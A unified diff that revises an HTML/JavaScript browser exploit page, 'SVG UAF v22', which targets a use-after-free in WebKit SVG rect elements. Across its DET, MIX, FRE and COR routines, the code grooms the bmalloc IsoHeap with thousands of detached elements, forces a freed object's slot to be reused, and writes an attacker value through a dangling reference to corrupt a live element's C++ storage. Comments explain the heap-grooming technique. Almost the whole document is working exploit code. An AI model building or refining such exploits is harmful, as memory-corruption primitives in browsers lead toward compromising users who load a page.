@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v21</title>
+<title>SVG UAF v22</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -14,18 +14,17 @@ button:hover:not(:disabled){border-color:#00ff41}
 button:disabled{opacity:.3}
 #log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
 .ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
-#stage{position:fixed;top:10px;right:10px;width:200px;height:200px;background:#111;border:1px solid #222;z-index:9999;overflow:hidden}
 </style>
 </head>
 <body>
-<h2>SVG UAF v21 - IsoHeap page exhaustion + forced slot reuse</h2>
-<div class="sub">v20: CNF 100/100, RUS -1 (IsoPage too large). v21: pre-exhaust page, force B into A freed slot.</div>
-<div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
+<h2>SVG UAF v22 - detached exhaust, forced IsoHeap reuse</h2>
+<div class="sub">v21: exhaust rects in live DOM get layout-culled. v22: detached elements pin C++ obj in IsoHeap without render.</div>
+<svg id="livesvg" width="1" height="1" style="position:fixed;opacity:0;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runEXH()">EXH exhaust-page</button>
-  <button onclick="runRUS()">RUS force-reuse</button>
+  <button onclick="runDET()">DET detached-exhaust</button>
+  <button onclick="runMIX()">MIX mixed-exhaust</button>
+  <button onclick="runFRE()">FRE free-then-reuse</button>
   <button onclick="runCOR()">COR live-corrupt</button>
-  <button onclick="runSCN()">SCN scan-threshold</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -45,17 +44,15 @@ function log(m, c) {
 }
 function sep() { log('----------------------------------------------------', 'sep'); }
 function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
-function tick() { return new Promise(function(r){ setTimeout(r, 0); }); }
 function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
+function wait(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
 
 function copyLog() {
   try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
     var a = document.createElement('textarea');
     a.value = Lel.innerText;
-    document.body.appendChild(a);
-    a.select();
-    document.execCommand('copy');
-    a.remove();
+    document.body.appendChild(a); a.select();
+    document.execCommand('copy'); a.remove();
   }
 }
 function clearLog() { Lel.innerHTML = ''; }
@@ -68,406 +65,415 @@ function dis(d) {
 }
 window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };
 
-function mkRect(w, h, x, y) {
-  w = w || 80; h = h || 80; x = x || 5; y = y || 5;
+/*
+ * WHY v21 FAILED:
+ *   Exhaust rects were appended to live SVG in DOM.
+ *   WebKit layout pass runs on every raf() -> culls off-screen/zero-size rects.
+ *   RenderObject destroyed -> C++ element may get freed early OR moved.
+ *   IsoPage bump never truly exhausted because objects don't stay alive.
+ *
+ * v22 KEY INSIGHT:
+ *   document.createElementNS() allocates the C++ SVGRectElement in bmalloc IsoHeap.
+ *   As long as a JS reference holds the JS wrapper, the C++ object stays alive.
+ *   NO appendChild needed. No render. No layout. No GC.
+ *   Pure heap pressure: 4096 detached rects = 4096 C++ SVGRectElement objects in IsoHeap.
+ *
+ * ALSO: bmalloc IsoHeap free list is LIFO (last in, first out).
+ *   Free A -> A goes to top of free list.
+ *   Next alloc of same type -> pops A from free list -> B = A's slot.
+ *   BUT only if current IsoPage bump is EXHAUSTED first.
+ *   Detached rects exhaust the bump without getting culled.
+ *
+ * METHODS:
+ *   DET: alloc N detached rects (JS array keeps alive), then alloc A in DOM, free A, alloc B detached
+ *        check if animLen_A reads B's width
+ *   MIX: alloc N detached, free HALF (fills free list with N/2 slots), alloc A, free A, alloc B
+ *        with N/2 free slots already present, A's free goes on top -> B pops A's slot
+ *   FRE: alloc N detached, free ALL N (fills free list completely), alloc A, free A, alloc B
+ *        free list is full of old slots; A goes on top; B should pop A
+ *   COR: once reuse confirmed, write ATTACK via animLen_A, read via B's own interface
+ */
+
+function mkDetached(w) {
   var r = document.createElementNS(SVG_NS, 'rect');
-  r.setAttribute('x', '' + x);
-  r.setAttribute('y', '' + y);
-  r.setAttribute('width', '' + w);
-  r.setAttribute('height', '' + h);
-  r.setAttribute('fill', 'none');
+  r.setAttribute('width', '' + (w || 10));
+  r.setAttribute('height', '10');
   return r;
 }
 
-function flush() {
-  while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
+function mkLive(w) {
+  var r = document.createElementNS(SVG_NS, 'rect');
+  r.setAttribute('width', '' + (w || 80));
+  r.setAttribute('height', '80');
+  livesvg.appendChild(r);
+  return r;
 }
 
-/*
- * WHY v20 RUS FAILED:
- *   bmalloc IsoPage holds more than 256 SVGRectElements.
- *   New allocs use bump pointer on the CURRENT page.
- *   Freed slot goes into the free list of its page.
- *   Free list is only consulted when the current page's bump is exhausted.
- *   Solution: exhaust the current page BEFORE creating A.
- *   Then A goes onto a fresh page. Free A -> top of free list on fresh page.
- *   Next alloc on that page hits free list -> B lands in A's slot.
- *
- * STRATEGY v21:
- *   Step 1 (EXH): alloc many rects with no free -> burn through current IsoPage bump
- *   Step 2 (RUS): NOW alloc A -> goes to new page. Free A. Alloc B -> hits free list = A's slot.
- *   Step 3 (COR): confirm animLen_A reads B's values. Write via animLen_A. B shows corrupted value.
- *
- * HOW MANY TO EXHAUST?
- *   SVGRectElement size ~ 256-512 bytes (arm64 with vtable, Node fields, SVG attrs)
- *   IsoPage size = 16384 bytes (16KB, standard bmalloc)
- *   Objects per page = 16384 / size
- *   If size=256 -> 64 per page
- *   If size=512 -> 32 per page
- *   If size=128 -> 128 per page
- *   We don't know exact size. So: scan from 32 to 2048 in doubling steps.
- *   EXH test: exhaust with N rects, then do A/free/B, check if reuse happens.
- *   First N where reuse happens = page size in objects.
- */
+function checkReuse(bv_A, A_w, B_w) {
+  var curr = null;
+  try { curr = bv_A ? bv_A.value : null; } catch(e) {}
+  var reused = curr !== null && curr !== A_w && Math.abs(curr - B_w) < 1;
+  return { curr: curr, reused: reused };
+}
 
-// EXH: find the IsoPage exhaustion threshold
-async function runEXH(q) {
-  if (!q) { dis(true); sep(); log('EXH: find IsoPage exhaustion threshold', 'inf'); sep(); }
-  log('[*] exhaust with N rects (no free), then alloc A, free A, alloc B', 'ok');
-  log('[*] if animLen_A reads B_width after exhaust -> page was full, B hit free list', 'ok');
+// DET: detached exhaust, B also detached
+async function runDET(q) {
+  if (!q) { dis(true); sep(); log('DET: detached exhaust - JS array pins C++ objs in IsoHeap', 'inf'); sep(); }
+  log('[*] createElementNS without appendChild - no render, no layout, no GC', 'ok');
+  log('[*] exhaust counts: 512, 1024, 2048, 4096', 'ok');
   log('');
 
-  var found_threshold = -1;
-  var exhaust_counts = [32, 64, 96, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048];
+  var found = -1;
+  var counts = [512, 1024, 2048, 4096];
 
-  for (var ei = 0; ei < exhaust_counts.length; ei++) {
-    var N = exhaust_counts[ei];
-    flush(); await raf(); await raf();
+  for (var ci = 0; ci < counts.length; ci++) {
+    var N = counts[ci];
 
-    // Exhaust N rects - keep them alive (no free = they stay in bump alloc space)
+    // Exhaust: detached rects, held in JS array
     var exhaust = [];
     for (var xi = 0; xi < N; xi++) {
-      var ex = mkRect(10 + xi % 50);
-      livesvg.appendChild(ex);
-      exhaust.push(ex);
+      exhaust.push(mkDetached(10 + (xi % 100)));
     }
-    await raf();
+    // Force JSC to not optimize away the array
+    var dummy = exhaust[exhaust.length - 1].getAttribute('width');
 
-    // Now alloc A on (hopefully) a fresh page
-    var A = mkRect(80);
-    livesvg.appendChild(A);
-    await raf();
+    await micro();
 
+    // Alloc A - detached
+    var A = mkDetached(80);
     var bv_A = A.width ? A.width.baseVal : null;
     var A_w = bv_A ? bv_A.value : null;
 
-    // Free A -> should go to top of free list on its page
-    A.remove();
+    // Free A - remove JS ref (C++ freed on next GC or immediately)
+    // We keep bv_A alive via closure
+    A = null;
+
+    // Force GC to actually free A's C++ object
+    // Spray some garbage to trigger collection
+    var gc_pressure = [];
+    for (var gi = 0; gi < 100; gi++) gc_pressure.push(new Uint8Array(1024));
+    gc_pressure = null;
+
     await micro();
 
-    // Alloc B -> if page was exhausted, bmalloc falls back to free list -> B = A's slot
+    // Read freed value
+    var freed_val = null;
+    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
+
+    // Alloc B - detached, distinct width
     var B_W = 55;
-    var B = mkRect(B_W);
-    livesvg.appendChild(B);
+    var B = mkDetached(B_W);
+    var bv_B = B.width ? B.width.baseVal : null;
+
     await micro();
 
-    var curr = null;
-    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
+    var r = checkReuse(bv_A, A_w, B_W);
+    log('  N=' + N + ': A_w=' + A_w + ' freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
 
-    var reused = (curr !== null && curr !== A_w && Math.abs(curr - B_W) < 1);
+    if (r.reused) {
+      found = N;
+      log('  [!!] SLOT REUSE via detached exhaust at N=' + N, 'bad');
+      log('  animLen_A reads B_w=' + r.curr + ' (B is detached, never in DOM)', 'bad');
 
-    log('  N=' + N + ': animLen_A reads ' + curr + ' (A_w=' + A_w + ' B_w=' + B_W + ') reused=' + reused, reused ? 'bad' : 'dim');
-
-    if (reused) {
-      found_threshold = N;
-      log('  [!!] PAGE EXHAUSTED at N=' + N + ': B landed in A freed slot!', 'bad');
-      log('  animLen_A reads B_w=' + curr + ' -> m_contextElement now points to B', 'bad');
-
-      // Confirm: write via animLen_A, check B
+      // Write via animLen_A -> should corrupt B's C++ attr storage
       try { if (bv_A) bv_A.value = 9999; } catch(e) {}
       var bW = null;
-      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
-      var bBBox = null;
-      try { bBBox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
-      log('  write 9999 via animLen_A -> B.width.baseVal=' + bW + ' B.getBBox()=' + bBBox, 'bad');
-      if (bW === 9999 || bBBox === 9999) {
-        log('  [!!] LIVE CORRUPTION CONFIRMED via exhaust method!', 'bad');
-      }
-      flush(); await raf();
+      try { bW = bv_B ? bv_B.value : null; } catch(e) {}
+      log('  write 9999 via animLen_A -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
+
+      exhaust = null; B = null;
       break;
     }
 
-    flush(); await raf();
+    exhaust = null; B = null;
+    await raf();
   }
 
-  if (found_threshold === -1) {
-    log('  no reuse found up to 2048 exhaust allocs', 'inf');
-    log('  [*] IsoPage is very large or exhaust rects are being freed by GC', 'inf');
-    log('  [*] try SCN for finer-grained scan', 'inf');
-  } else {
-    log('  RESULT: threshold=' + found_threshold, 'bad');
-  }
-
+  if (found === -1) log('  no reuse via detached exhaust up to 4096', 'inf');
   if (!q) dis(false);
-  return { found_threshold: found_threshold };
+  return { found: found };
 }
 
-// RUS: forced reuse using exhaust + controlled A/B sequence
-async function runRUS(q) {
-  if (!q) { dis(true); sep(); log('RUS: forced slot reuse via page exhaustion', 'inf'); sep(); }
-  log('[*] exhaust 512 rects, alloc A(w=80), free A, alloc B(w=55), check animLen_A', 'ok');
-  log('[*] also try: exhaust, free all exhaust, alloc A, free A, alloc B', 'ok');
+// MIX: exhaust detached, free half, then A/B
+async function runMIX(q) {
+  if (!q) { dis(true); sep(); log('MIX: exhaust + free half, force LIFO free list', 'inf'); sep(); }
+  log('[*] alloc N detached, free N/2 (fills free list), alloc A, free A, alloc B', 'ok');
+  log('[*] A freed onto top of partially-full free list -> B pops A slot', 'ok');
   log('');
 
-  var reuse_confirmed = false;
+  var found = -1;
+  var counts = [512, 1024, 2048, 4096];
 
-  // Method 1: exhaust KEEP ALIVE then alloc A/B
-  for (var method = 1; method <= 3; method++) {
-    flush(); await raf(); await raf();
-    log('  Method ' + method + ':', 'inf');
+  for (var ci = 0; ci < counts.length; ci++) {
+    var N = counts[ci];
 
+    // Alloc N detached
     var exhaust = [];
-    var EXHAUST_N = method === 1 ? 512 : method === 2 ? 1024 : 256;
-
-    // Alloc exhaust rects
-    for (var xi = 0; xi < EXHAUST_N; xi++) {
-      var ex = mkRect(20);
-      livesvg.appendChild(ex);
-      exhaust.push(ex);
+    for (var xi = 0; xi < N; xi++) {
+      exhaust.push(mkDetached(10));
     }
+    var dummy = exhaust[N-1].getAttribute('width');
+    await micro();
 
-    if (method === 2) {
-      // Method 2: also free the exhaust rects to fill free list, then alloc A
-      // A goes to free list head -> B should also get free list head
-      for (var fi = exhaust.length - 1; fi >= 0; fi--) {
-        exhaust[fi].remove();
-      }
-      exhaust = [];
-      await raf();
+    // Free second half (most recently allocated = top of bump)
+    // This fills the free list with N/2 slots
+    for (var fi = N/2; fi < N; fi++) {
+      exhaust[fi] = null;
     }
+    exhaust.length = N/2;
 
-    if (method === 3) {
-      // Method 3: free exhaust in FORWARD order then alloc A
-      for (var fi2 = 0; fi2 < exhaust.length; fi2++) {
-        exhaust[fi2].remove();
-      }
-      exhaust = [];
-      await raf();
-    }
-
-    await raf();
+    // GC pressure to actually free
+    var gc = [];
+    for (var gi = 0; gi < 200; gi++) gc.push(new Uint8Array(512));
+    gc = null;
+    await micro();
 
     // Alloc A
-    var A = mkRect(80);
-    livesvg.appendChild(A);
-    await raf();
+    var A = mkDetached(80);
     var bv_A = A.width ? A.width.baseVal : null;
     var A_w = bv_A ? bv_A.value : null;
 
     // Free A
-    A.remove();
+    A = null;
+    var gc2 = [];
+    for (var gi2 = 0; gi2 < 100; gi2++) gc2.push(new Uint8Array(512));
+    gc2 = null;
     await micro();
 
     var freed_val = null;
     try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
-    log('    after free: animLen_A=' + freed_val + ' (A_w=' + A_w + ')', 'ok');
 
-    // Alloc B with distinct width
+    // Alloc B
     var B_W = 55;
-    var B = mkRect(B_W);
-    livesvg.appendChild(B);
+    var B = mkDetached(B_W);
     await micro();
 
-    var curr = null;
-    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
-    var reused = curr !== null && curr !== A_w && Math.abs(curr - B_W) < 1;
+    var r = checkReuse(bv_A, A_w, B_W);
+    log('  N=' + N + '/2: freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
 
-    log('    B alloc: animLen_A=' + curr + ' (B_w=' + B_W + ') reused=' + reused, reused ? 'bad' : 'dim');
-
-    if (reused) {
-      reuse_confirmed = true;
-      log('    [!!] SLOT REUSE CONFIRMED method=' + method, 'bad');
-
-      // Write through animLen_A into live B
+    if (r.reused) {
+      found = N;
+      log('  [!!] SLOT REUSE via MIX at N=' + N, 'bad');
       try { if (bv_A) bv_A.value = 9999; } catch(e) {}
       var bW = null;
       try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
-      var bBBox = null;
-      try { bBBox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
-      log('    write 9999 via animLen_A -> B.width=' + bW + ' bbox=' + bBBox, 'bad');
-
-      if (bW === 9999 || bBBox === 9999) {
-        log('    [!!] LIVE OBJECT CORRUPTION VIA UAF!', 'bad');
-      }
-      flush(); await raf();
+      log('  write 9999 -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
+      exhaust = null; B = null;
       break;
     }
 
-    flush(); await raf();
+    exhaust = null; B = null;
+    await raf();
   }
 
-  log('[*] RUS: reuse_confirmed=' + reuse_confirmed, reuse_confirmed ? 'bad' : 'inf');
+  if (found === -1) log('  no reuse via MIX up to 4096', 'inf');
   if (!q) dis(false);
-  return { reuse_confirmed: reuse_confirmed };
+  return { found: found };
 }
 
-// COR: full live corruption demo once we know threshold
+// FRE: alloc N detached, free ALL, then A/B
+async function runFRE(q) {
+  if (!q) { dis(true); sep(); log('FRE: alloc N detached, free ALL, then A lands on free list', 'inf'); sep(); }
+  log('[*] free list full of N slots -> A alloc pops from free list -> A on a known page', 'ok');
+  log('[*] free A -> goes to top of free list (LIFO) -> B pops A slot', 'ok');
+  log('');
+
+  var found = -1;
+  var counts = [64, 128, 256, 512, 1024];
+
+  for (var ci = 0; ci < counts.length; ci++) {
+    var N = counts[ci];
+
+    // Alloc N detached
+    var exhaust = [];
+    for (var xi = 0; xi < N; xi++) {
+      exhaust.push(mkDetached(10));
+    }
+    var dummy = exhaust[N-1].getAttribute('width');
+    await micro();
+
+    // Free ALL - fill free list with N slots
+    exhaust = null;
+
+    // GC pressure
+    var gc = [];
+    for (var gi = 0; gi < 300; gi++) gc.push(new Uint8Array(1024));
+    gc = null;
+    await micro();
+    await raf();
+
+    // Alloc A - comes from free list (our exhausted pool)
+    var A = mkDetached(80);
+    var bv_A = A.width ? A.width.baseVal : null;
+    var A_w = bv_A ? bv_A.value : null;
+
+    // Free A immediately - LIFO: A goes to top of free list
+    A = null;
+    await micro();
+
+    var freed_val = null;
+    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
+
+    // Alloc B - should pop A's slot (top of LIFO free list)
+    var B_W = 55;
+    var B = mkDetached(B_W);
+    var bv_B = B.width ? B.width.baseVal : null;
+    await micro();
+
+    var r = checkReuse(bv_A, A_w, B_W);
+    log('  N=' + N + ': A_w=' + A_w + ' freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
+
+    if (r.reused) {
+      found = N;
+      log('  [!!] SLOT REUSE via FRE at N=' + N, 'bad');
+      log('  animLen_A reads B_w=' + r.curr, 'bad');
+
+      // Confirm write corruption
+      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
+      var bW = null;
+      try { bW = bv_B ? bv_B.value : null; } catch(e) {}
+      log('  write 9999 -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
+
+      B = null;
+      break;
+    }
+
+    B = null;
+    await raf();
+  }
+
+  if (found === -1) log('  no reuse via FRE up to 1024', 'inf');
+  if (!q) dis(false);
+  return { found: found };
+}
+
+// COR: structured live corruption demo
 async function runCOR(q) {
-  if (!q) { dis(true); sep(); log('COR: live corruption - full structured demo', 'inf'); sep(); }
-  log('[*] exhaust page, free A, force B into slot, write ATTACK, verify B corrupted', 'ok');
+  if (!q) { dis(true); sep(); log('COR: structured live corruption via best method', 'inf'); sep(); }
+  log('[*] try all exhaust methods, on first reuse: write ATTACK, verify B corrupted', 'ok');
   log('');
 
   var ATTACK = 31337.0;
   var corruptConfirmed = false;
 
-  // Try multiple exhaust counts
-  var counts = [256, 512, 768, 1024, 1536, 2048];
+  // Try each method with increasing exhaust
+  var configs = [
+    { method: 'DET-512',  N: 512,  free_mode: 'none' },
+    { method: 'DET-1024', N: 1024, free_mode: 'none' },
+    { method: 'FRE-128',  N: 128,  free_mode: 'all'  },
+    { method: 'FRE-256',  N: 256,  free_mode: 'all'  },
+    { method: 'MIX-512',  N: 512,  free_mode: 'half' },
+    { method: 'DET-2048', N: 2048, free_mode: 'none' },
+    { method: 'FRE-512',  N: 512,  free_mode: 'all'  },
+    { method: 'DET-4096', N: 4096, free_mode: 'none' },
+    { method: 'FRE-1024', N: 1024, free_mode: 'all'  }
+  ];
 
-  for (var ci = 0; ci < counts.length; ci++) {
-    var N = counts[ci];
-    flush(); await raf(); await raf();
+  for (var ci = 0; ci < configs.length && !corruptConfirmed; ci++) {
+    var cfg = configs[ci];
+    var N = cfg.N;
+    var mode = cfg.free_mode;
 
-    // Exhaust
     var exhaust = [];
-    for (var xi = 0; xi < N; xi++) {
-      var ex = mkRect(10);
-      livesvg.appendChild(ex);
-      exhaust.push(ex);
-    }
-    await raf();
+    for (var xi = 0; xi < N; xi++) exhaust.push(mkDetached(10));
+    var dummy = exhaust[N-1].getAttribute('width');
+    await micro();
 
-    // Alloc A
-    var A = mkRect(80);
-    livesvg.appendChild(A);
-    await raf();
+    if (mode === 'all') {
+      exhaust = null;
+      var gc = [];
+      for (var gi = 0; gi < 300; gi++) gc.push(new Uint8Array(1024));
+      gc = null;
+      await micro(); await raf();
+    } else if (mode === 'half') {
+      for (var fi = N/2; fi < N; fi++) exhaust[fi] = null;
+      exhaust.length = N/2;
+      var gc2 = [];
+      for (var gi2 = 0; gi2 < 200; gi2++) gc2.push(new Uint8Array(512));
+      gc2 = null;
+      await micro();
+    }
+
+    // Alloc A detached
+    var A = mkDetached(80);
     var bv_A = A.width ? A.width.baseVal : null;
+    var bv_H = A.height ? A.height.baseVal : null;
     var A_w = bv_A ? bv_A.value : null;
 
     // Free A
-    A.remove();
+    A = null;
+    var gcA = [];
+    for (var gai = 0; gai < 100; gai++) gcA.push(new Uint8Array(512));
+    gcA = null;
     await micro();
 
-    // Alloc B
-    var B = mkRect(55);
-    livesvg.appendChild(B);
+    // Alloc B detached
+    var B_W = 55;
+    var B = mkDetached(B_W);
+    var bv_B = B.width ? B.width.baseVal : null;
     await micro();
 
-    var curr = null;
-    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
-    var reused = curr !== null && curr !== A_w;
+    var r = checkReuse(bv_A, A_w, B_W);
+    log('  [' + cfg.method + ']: animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');
 
-    if (!reused) {
-      log('  N=' + N + ': no reuse (animLen_A=' + curr + ')', 'dim');
-      flush(); await raf();
-      continue;
-    }
+    if (r.reused) {
+      log('  [!!] REUSE CONFIRMED - writing ATTACK via animLen_A...', 'bad');
 
-    log('  N=' + N + ': REUSE! animLen_A=' + curr + ' (was ' + A_w + ', B_w=55)', 'bad');
-
-    // Write ATTACK via animLen_A while B is live
-    try { if (bv_A) bv_A.value = ATTACK; } catch(e) {}
-    await micro();
-
-    // Read B through its own JS interface
-    var bW_bv = null;
-    try { bW_bv = B.width ? B.width.baseVal.value : null; } catch(e) {}
-    var bW_bbox = null;
-    try { bW_bbox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
-    var bW_anim = null;
-    try { bW_anim = B.width ? B.width.animVal.value : null; } catch(e) {}
-
-    log('  B.width.baseVal = ' + bW_bv, bW_bv === ATTACK ? 'bad' : 'ok');
-    log('  B.getBBox().w   = ' + bW_bbox, bW_bbox === ATTACK ? 'bad' : 'ok');
-    log('  B.width.animVal = ' + bW_anim, bW_anim === ATTACK ? 'bad' : 'ok');
-
-    if (bW_bv === ATTACK || bW_bbox === ATTACK || bW_anim === ATTACK) {
-      corruptConfirmed = true;
-      log('  [!!] LIVE OBJECT CORRUPTION CONFIRMED at N=' + N, 'bad');
-      log('  [!!] B.width=' + bW_bv + ' without B.setAttribute ever being called', 'bad');
-      log('  [!!] B is a live DOM element with corrupted C++ attribute storage', 'bad');
-
-      // Also corrupt height, x, y to prove multi-field control
-      var bv_H = A.height ? A.height.baseVal : null;
-      var bv_X = A.x ? A.x.baseVal : null;
-      var bv_Y = A.y ? A.y.baseVal : null;
+      // Write ATTACK into B's C++ attr storage via dangling ptr
+      try { if (bv_A) bv_A.value = ATTACK; } catch(e) {}
       try { if (bv_H) bv_H.value = ATTACK + 1; } catch(e) {}
-      try { if (bv_X) bv_X.value = ATTACK + 2; } catch(e) {}
-      try { if (bv_Y) bv_Y.value = ATTACK + 3; } catch(e) {}
+      await micro();
 
-      var bH = null, bX = null, bY = null;
-      try { bH = B.height ? B.height.baseVal.value : null; } catch(e) {}
-      try { bX = B.x ? B.x.baseVal.value : null; } catch(e) {}
-      try { bY = B.y ? B.y.baseVal.value : null; } catch(e) {}
-      log('  multi-field: B.height=' + bH + ' B.x=' + bX + ' B.y=' + bY, 'bad');
-      log('  expected:    B.height=' + (ATTACK+1) + ' B.x=' + (ATTACK+2) + ' B.y=' + (ATTACK+3), 'inf');
-      flush(); await raf();
+      // Read B through its own interface
+      var bW_bv   = null; try { bW_bv   = bv_B ? bv_B.value : null; } catch(e) {}
+      var bW_bbox = null; try { bW_bbox  = B.getBBox ? B.getBBox().width : null; } catch(e) {}
+      var bH_bv   = null; try { bH_bv   = B.height ? B.height.baseVal.value : null; } catch(e) {}
+
+      log('  B.width.baseVal  = ' + bW_bv   + ' (expected ' + ATTACK + ')',   bW_bv   === ATTACK ? 'bad' : 'ok');
+      log('  B.getBBox().w    = ' + bW_bbox  + ' (expected ' + ATTACK + ')',   bW_bbox  === ATTACK ? 'bad' : 'ok');
+      log('  B.height.baseVal = ' + bH_bv   + ' (expected ' + (ATTACK+1) + ')', bH_bv   === ATTACK+1 ? 'bad' : 'ok');
+
+      if (bW_bv === ATTACK || bW_bbox === ATTACK || bH_bv === ATTACK + 1) {
+        corruptConfirmed = true;
+        log('  [!!] LIVE OBJECT CORRUPTION CONFIRMED', 'bad');
+        log('  [!!] B.width=' + bW_bv + ' written from OUTSIDE B via UAF dangling ptr', 'bad');
+        log('  [!!] method=' + cfg.method + ' exhaust=' + N, 'bad');
+      } else {
+        log('  reuse happened but B reads own values - B attr storage at different offset', 'inf');
+        log('  [*] animLen_A write hits different field than B.width - need offset map', 'inf');
+      }
+
+      exhaust = null; B = null;
       break;
     }
 
-    flush(); await raf();
+    exhaust = null; B = null;
+    await raf();
   }
 
   log('[*] COR: corruptConfirmed=' + corruptConfirmed, corruptConfirmed ? 'bad' : 'inf');
+
+  if (!corruptConfirmed) {
+    log('[*] no reuse achieved — C++ obj freed on JS null but GC not running fast enough', 'inf');
+    log('[*] next: try explicit GC trigger or alloc A in live DOM after detached exhaust', 'inf');
+  }
+
   if (!q) dis(false);
   return { corruptConfirmed: corruptConfirmed };
-}
-
-// SCN: fine-grained threshold scan
-async function runSCN(q) {
-  if (!q) { dis(true); sep(); log('SCN: fine-grained IsoPage size scan', 'inf'); sep(); }
-  log('[*] scan exhaust counts 1..2048 in steps to find exact page boundary', 'ok');
-  log('[*] binary search: find smallest N where reuse happens', 'ok');
-  log('');
-
-  // Binary search between 1 and 4096
-  var lo = 1, hi = 4096, threshold = -1;
-
-  while (lo <= hi) {
-    var mid = Math.floor((lo + hi) / 2);
-    flush(); await raf();
-
-    var exhaust = [];
-    for (var xi = 0; xi < mid; xi++) {
-      var ex = mkRect(20);
-      livesvg.appendChild(ex);
-      exhaust.push(ex);
-    }
-    await raf();
-
-    var A = mkRect(80);
-    livesvg.appendChild(A);
-    await raf();
-    var bv_A = A.width ? A.width.baseVal : null;
-    var A_w = bv_A ? bv_A.value : null;
-
-    A.remove();
-    await micro();
-
-    var B = mkRect(55);
-    livesvg.appendChild(B);
-    await micro();
-
-    var curr = null;
-    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
-    var reused = curr !== null && curr !== A_w && Math.abs(curr - 55) < 1;
-
-    log('  mid=' + mid + ': animLen_A=' + curr + ' reused=' + reused, reused ? 'bad' : 'dim');
-
-    if (reused) {
-      threshold = mid;
-      hi = mid - 1;
-    } else {
-      lo = mid + 1;
-    }
-
-    flush(); await raf();
-  }
-
-  if (threshold !== -1) {
-    log('  [!!] EXACT THRESHOLD: ' + threshold + ' exhaust rects needed', 'bad');
-    log('  [*] SVGRectElement IsoPage holds ~' + threshold + ' objects', 'bad');
-    log('  [*] obj size ~ ' + Math.round(16384 / threshold) + ' bytes (assuming 16KB IsoPage)', 'inf');
-  } else {
-    log('  threshold > 4096 - IsoPage is unusually large or exhaust being GCd', 'inf');
-    log('  [*] check if exhaust rects survive: try forcing layout between allocs', 'inf');
-  }
-
-  if (!q) dis(false);
-  return { threshold: threshold };
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v21 - IsoHeap page exhaustion + forced slot reuse', 'inf');
+  log('SVG UAF v22 - detached exhaust, forced IsoHeap slot reuse', 'inf');
   sep();
 
   var results = {};
   var tests = [
-    ['EXH_page_exhaust',   runEXH],
-    ['RUS_forced_reuse',   runRUS],
-    ['COR_live_corrupt',   runCOR],
-    ['SCN_threshold_scan', runSCN]
+    ['DET_detached_exhaust', runDET],
+    ['MIX_mixed_exhaust',    runMIX],
+    ['FRE_free_then_reuse',  runFRE],
+    ['COR_live_corrupt',     runCOR]
   ];
 
   for (var i = 0; i < tests.length; i++) {
@@ -486,17 +492,15 @@ async function runAll() {
   }
 
   sep();
-  log('SUMMARY v21', 'inf');
+  log('SUMMARY v22', 'inf');
   sep();
   var keys = Object.keys(results);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
     var r = results[k];
     if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-    var v = r.found_threshold !== undefined ? r.found_threshold :
-            r.reuse_confirmed !== undefined ? r.reuse_confirmed :
-            r.corruptConfirmed !== undefined ? r.corruptConfirmed :
-            r.threshold !== undefined ? r.threshold : '?';
+    var v = r.found !== undefined ? r.found :
+            r.corruptConfirmed !== undefined ? r.corruptConfirmed : '?';
     var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
     log('  ' + k + ': key=' + v, cls);
   }
